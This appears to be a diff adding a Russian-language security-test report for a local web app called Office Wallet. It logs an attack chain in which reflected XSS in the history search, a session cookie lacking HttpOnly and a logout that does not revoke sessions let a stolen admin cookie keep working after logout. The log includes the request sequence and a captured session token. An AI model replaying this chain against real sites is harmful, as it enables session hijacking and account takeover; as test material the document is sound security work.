@@ -1,0 +1,25 @@
+OFFICE WALLET · ЦЕПОЧКА АТАКИ
+################################################################################################
+# Ц-7
+################################################################################################
+== Ц-7 · XSS → украденная кука работает и после выхода ==
+    · Отражённый XSS без экранирования (OW-12) исполняет document.cookie;
+    · кука без HttpOnly (OW-30) отдаёт токен целиком; logout не отзывает
+    · сессию на сервере (OW-29) — украденная копия живёт своей жизнью.
+    → POST /login  login=ivanov (куки → Client)
+    ← HTTP 302 redirect=http://localhost:18081/  <!DOCTYPE html> <html lang="ru"> <head>   <meta charset="utf-8">   <meta name="viewport" content="width=device-width, initial-scale=1">   <title>Обзор · Office Wallet</title>   <link rel="preconnect" href="https://fonts.googleapis.com">   ...
+    → GET /history?q=<payload>
+    ← HTTP 200  <!DOCTYPE html> <html lang="ru"> <head>   <meta charset="utf-8">   <meta name="viewport" content="width=device-width, initial-scale=1">   <title>История · Office Wallet</title>   <link rel="preconnect" href="https://fonts.googleapis.com"> ...
+    → POST /login  login=ivanov (куки → Client)
+    ← HTTP 302 redirect=http://localhost:18081/  <!DOCTYPE html> <html lang="ru"> <head>   <meta charset="utf-8">   <meta name="viewport" content="width=device-width, initial-scale=1">   <title>Обзор · Office Wallet</title>   <link rel="preconnect" href="https://fonts.googleapis.com">   ...
+    → GET /logout  (жертва выходит)
+    ← HTTP 302 redirect=http://localhost:18081/login  <!DOCTYPE html> <html lang="ru"> <head>   <meta charset="utf-8">   <meta name="viewport" content="width=device-width, initial-scale=1">   <title>Вход · Office Wallet</title>   <link rel="preconnect" href="https://fonts.googleapis.com">   <...
+    → GET / с украденной кукой ПОСЛЕ выхода
+    ← HTTP 200  <!DOCTYPE html> <html lang="ru"> <head>   <meta charset="utf-8">   <meta name="viewport" content="width=device-width, initial-scale=1">   <title>Обзор · Office Wallet</title>   <link rel="preconnect" href="https://fonts.googleapis.com">   ...
+    ┌─ АРТЕФАКТ · Ц-7 · сессия уходит вместе с payload'ом
+    │ GET /history?q=… → payload отражён без экранирования: да
+    │ Set-Cookie: ow_session=ow.1.admin.888b25bca7475d932c148464a139cf1ac039a3678c212962c04ee3b44958b899; Path=/; SameSite=Lax
+    │ HttpOnly=False; GET /logout → 302; GET / прежней кукой → HTTP 200
+    │ украденное значение: ow_session=ow.1.admin.888b25bca7475d932c148464a…
+    └─
+[+] payload отражён, кука без HttpOnly и работает после logout
